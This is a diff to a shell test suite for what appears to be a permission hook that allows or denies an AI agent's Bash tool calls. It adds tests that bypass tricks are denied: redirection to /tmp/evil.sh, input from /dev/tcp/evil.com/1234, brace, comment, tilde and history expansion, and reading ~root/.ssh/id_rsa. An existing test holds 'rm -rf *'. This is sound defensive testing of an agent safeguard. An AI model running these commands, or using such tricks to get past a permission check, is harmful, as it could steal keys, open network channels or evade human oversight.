@@ -75,12 +75,18 @@ TEST_TMPDIR=$(mktemp -d /tmp/dyad-test-tmpdir-XXXXXXXX)
 setup() {
   echo "implement the login page" > "$TASK_FILE"
 
+  # Create API key file (file-based passing, not env var)
+  TEST_API_KEY_FILE="${TEST_TMPDIR}/api-key"
+  echo -n "test-key-for-tests" > "$TEST_API_KEY_FILE"
+  chmod 600 "$TEST_API_KEY_FILE"
+
   export DYAD_TASK_FILE="$TASK_FILE"
   export DYAD_RULES_FILE="$RULES"
   export DYAD_APPROVE_ALL="false"
   export DYAD_SESSION_ID="test-$$"
   export DYAD_PROJECT_ROOT="$SCRIPT_DIR"
   export DYAD_SESSION_TMPDIR="$TEST_TMPDIR"
+  export DYAD_API_KEY_FILE="$TEST_API_KEY_FILE"
 
   # Back up and reset audit log
   if [[ -f ~/.dyad/audit.log ]]; then
@@ -215,6 +221,35 @@ assert_decision "Safe: npm run" "allow"
 # Deny rules should still match even with metacharacters
 run_hook '{"tool_name":"Bash","tool_input":{"command":"rm -rf *"}}'
 assert_decision "Deny: rm -rf * still caught" "deny"
+
+echo ""
+echo "=== Security: output redirection bypass prevention ==="
+
+# Output redirection should be caught (> and < added to metacharacter check)
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git log > /tmp/evil.sh"}}'
+assert_decision "Bypass: git + output redirection (>)" "deny"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status >> /tmp/evil.sh"}}'
+assert_decision "Bypass: git + append redirection (>>)" "deny"
+
+run_hook '{"tool_name":"Bash","tool_input":{"command":"npm test < /dev/tcp/evil.com/1234"}}'
+assert_decision "Bypass: npm + input redirection (<)" "deny"
+
+# Brace expansion
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git {status,log}"}}'
+assert_decision "Bypass: git + brace expansion" "deny"
+
+# Comment injection
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status # ignore rest"}}'
+assert_decision "Bypass: git + comment injection (#)" "deny"
+
+# Tilde expansion
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git log ~root/.ssh/id_rsa"}}'
+assert_decision "Bypass: git + tilde expansion (~)" "deny"
+
+# History expansion
+run_hook '{"tool_name":"Bash","tool_input":{"command":"git status !:0"}}'
+assert_decision "Bypass: git + history expansion (!)" "deny"
 
 echo ""
 echo "=== Layer 1: Rule matching — no match (falls through to supervisor) ==="
